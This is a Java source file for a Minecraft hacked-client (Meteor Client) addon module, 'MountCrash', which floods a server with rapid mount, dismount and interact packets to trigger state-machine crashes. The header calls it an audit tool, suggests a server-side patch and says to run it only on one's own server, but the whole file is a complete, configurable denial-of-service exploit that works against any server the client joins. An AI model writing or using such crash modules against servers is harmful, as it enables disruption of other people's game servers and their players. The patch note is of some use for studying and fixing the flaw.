package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Mount / Dismount Crash
 *
 * Spams rapid mount (START_RIDING_JUMP / interact) and dismount (STOP_RIDING_JUMP)
 * packets while riding or looking at a rideable entity. The mount/dismount cycle
 * involves creating/destroying the vehicle-passenger relationship, updating entity
 * tracking, and recomputing bounding boxes for all involved entities. Rapid cycling
 * can expose state-machine gaps (passenger added while dismount is mid-flight) and
 * has caused CME-style crashes in past Paper builds.
 *
 * Patch signal: the mount state machine must be serialised per-vehicle and
 * per-player: reject mount requests while a dismount is pending (or vice-versa),
 * and enforce a per-tick rate limit on mount/dismount transitions.
 *
 * Ride or look at an entity, enable. Run against your OWN local server only.
 */
public class MountCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("per-tick").description("Mount/dismount pairs per tick.")
        .defaultValue(50).range(1, 500).sliderRange(1, 200).build()
    );
    private final Setting<Boolean> interactToo = sgGeneral.add(new BoolSetting.Builder()
        .name("interact-too").description("Also send interact (mount) packets on the crosshair entity.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public MountCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "mount-crash",
            "Rapid mount/dismount packet spam. Tests mount state-machine atomicity and transition rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        Entity vehicle = mc.player.getVehicle();
        Entity looked = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;

        for (int i = 0; i < perTick.get(); i++) {
            if (vehicle != null) {
                mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(
                    mc.player, ClientCommandC2SPacket.Mode.START_RIDING_JUMP));
            packetsSent++;
                mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(
                    mc.player, ClientCommandC2SPacket.Mode.STOP_RIDING_JUMP));
            packetsSent++;
            }
            if (interactToo.get() && looked != null) {
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(looked, mc.player.isSneaking(), Hand.MAIN_HAND));
            packetsSent++;
            }
        }
        if (vehicle == null && looked == null) warning("Ride something or look at a rideable entity.");
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
